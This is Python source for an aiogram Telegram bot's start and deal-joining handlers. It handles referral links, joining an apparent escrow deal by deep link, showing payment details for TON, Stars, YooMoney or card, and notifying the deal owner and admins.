# - *- coding: utf- 8 - *-
import json

from aiogram import Router, Bot, F
from aiogram.types import Message, FSInputFile, CallbackQuery
from aiogram_i18n import I18nContext
from aiogram_i18n.types import InputMediaPhoto

from bot.data.config import get_admins
from bot.database import Userx, Referrals, Deals, Worker
from bot.keyboard.inline_user import home, deal_markup, select_language
from bot.utils.const_functions import is_wallet_ton, get_bank_by_country, ded, send_owners
from bot.utils.misc.bot_models import FSM, ARS
from bot.routers.user.user_deals import admin_confirmation_keyboard, send_test_admin_notifications

router = Router(name=__name__)


@router.callback_query(F.data == "back")
async def back(call: CallbackQuery, bot: Bot, state: FSM, i18n: I18nContext):
    await state.clear()

    await call.message.edit_media(media=InputMediaPhoto(media=FSInputFile("bot/assets/images/home.JPG")))
    await call.message.edit_caption(
        caption=i18n.get("welcome-message"),
        reply_markup=home(i18n, False)
    )


async def show_home_menu(message: Message, bot: Bot, state: FSM, i18n: I18nContext):
    """Показать главное меню после выбора языка."""
    await state.clear()
    await message.answer_photo(
        photo=FSInputFile("bot/assets/images/home.JPG"),
        caption=i18n.get("welcome-message"),
        reply_markup=home(i18n, True)
    )


@router.message(F.text == "/start")
async def main_start(message: Message, bot: Bot, state: FSM, arSession: ARS, i18n: I18nContext):
    await state.clear()

    await message.answer(
        text=i18n.get("language-select"),
        reply_markup=select_language()
    )


@router.message(F.text.startswith('/start '))
async def main_start_deeplink(message: Message, bot: Bot, state: FSM, arSession: ARS, i18n: I18nContext):
    deepling_args = message.text[7:]

    if deepling_args.startswith("ref="):
        ref_wallet = deepling_args.replace("ref=", "")
        ref_user = Userx.get(user_ton_wallet=ref_wallet)

        if ref_user is None:
            await main_start(message, bot, state, arSession, i18n)
            return

        if Referrals.get(refferal_id=message.from_user.id) is None:
            Referrals.add(message.from_user.id, ref_user.user_id)
            Userx.update(user_id=ref_user.user_id, refferal_count=ref_user.refferal_count + 1)

        await main_start(message, bot, state, arSession, i18n)
        return

    deal_member = Userx.get(user_id=message.from_user.id)
    deal = Deals.get(deal_id=deepling_args)

    if deal is None:
        await message.reply(i18n.get("invalid_deal_id"))
        return

    # КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ:
    # создатель сделки хранится отдельно и не зависит от того,
    # чей кошелек сейчас указан в реквизитах.
    if deal.deal_owner_id:
        deal_owner = Userx.get(user_id=deal.deal_owner_id)
    else:
        # Совместимость со старыми сделками.
        if deal.deal_payment_method == "ton":
            deal_owner = Userx.get(user_ton_wallet=deal.deal_address)
        elif deal.deal_payment_method == "card":
            deal_owner = Userx.get(user_card_wallet=deal.deal_address)
        else:
            deal_owner = Userx.get(user_stars_wallet=deal.deal_address)

    if deal_owner is None:
        await message.reply(i18n.get("invalid_deal_id"))
        return

    if deal_owner.user_id == deal_member.user_id:
        await message.reply(i18n.get("own_deal_unsupport"))
        return

    if deal.deal_member not in (None, 0):
        await message.reply(i18n.get("already_buyer"))
        return

    Deals.update(
        deal_id=deal.deal_id,
        deal_member=deal_member.user_id,
        deal_status="member wait",
        seller_confirmed=0,
        buyer_confirmed=0
    )

    if deal.deal_payment_method == "stars":
        paid_text = ded(f"""
            ⭐ <b>Получатель Telegram Stars:</b> @{deal.deal_address}
        """)
    elif deal.deal_payment_method == "ton":
        paid_text = ded(f"""
            🏦 <b>Адрес для оплаты:</b>
            <code>{deal.deal_address}</code>
        """)
    elif deal.deal_payment_method == "yoomoney":
        paid_text = ded(f"""
            💜 <b>ЮMoney к оплате:</b> <code>{deal.deal_address}</code>
        """)
    else:
        paid_text = ded(f"""
            🏦 <b>Карта к оплате:</b> <code>{deal.deal_address}</code>
        """)

    await bot.send_message(
        chat_id=deal_owner.user_id,
        text=i18n.get(
            "joined_to_deal",
            username=message.from_user.username or "unknown",
            user_id=str(message.from_user.id),
            deal_id=deal.deal_id,
            deals_count=deal_member.sucessful_deals
        )
    )

    buyer_keyboard = deal_markup(
        i18n, True, deal.deal_id,
        deal.deal_address,
        deal.deal_payment_method == "ton",
        deal.deal_amount,
        deal.deal_payment_method
    )
    if deal_member.user_id in get_admins():
        buyer_keyboard = admin_confirmation_keyboard(i18n, deal.deal_id, "buyer")

    await message.answer(
        text=i18n.get(
            "deal_info",
            deal_id=deal.deal_id,
            username=deal_owner.user_login,
            user_id=str(deal_owner.user_id),
            deals_count=deal_owner.sucessful_deals,
            deal_description=deal.deal_description,
            deal_address=deal.deal_address,
            paid_text=paid_text,
            deal_amount=deal.deal_amount,
            currency=("Stars" if deal.deal_payment_method == "stars" or deal.deal_currency == "XTR" else deal.deal_currency),
            payment_details=paid_text
        ),
        reply_markup=buyer_keyboard
    )

    user_status = "пользователь"
    if Worker.get(worker_id=deal_member.user_id):
        user_status = "воркер"
    if deal_member.user_id in get_admins():
        user_status = "владелец"

    admin_text = ded(f"""
        🤝 К сделке #{deal.deal_id} присоединился {user_status} @{deal_member.user_login} (<b>{deal_member.user_id}</b>).

        💰 <b>Сумма:</b> <code>{deal.deal_amount} {deal.deal_currency}</code>
        📄 <b>Описание:</b> {deal.deal_description}

        👤 <b>Создатель/продавец:</b> @{deal_owner.user_login} (<b>{deal_owner.user_id}</b>)
        👤 <b>Покупатель:</b> @{deal_member.user_login} (<b>{deal_member.user_id}</b>)

        ⚠️ Это сообщение отправляется тестерам/создателям бота.
    """)

    # Если создатель или участник — админ-тестер, соответствующая кнопка
    # появится именно у него.
    await send_test_admin_notifications(
        bot, admin_text, deal.deal_id, deal_owner.user_id, deal_member.user_id
    )
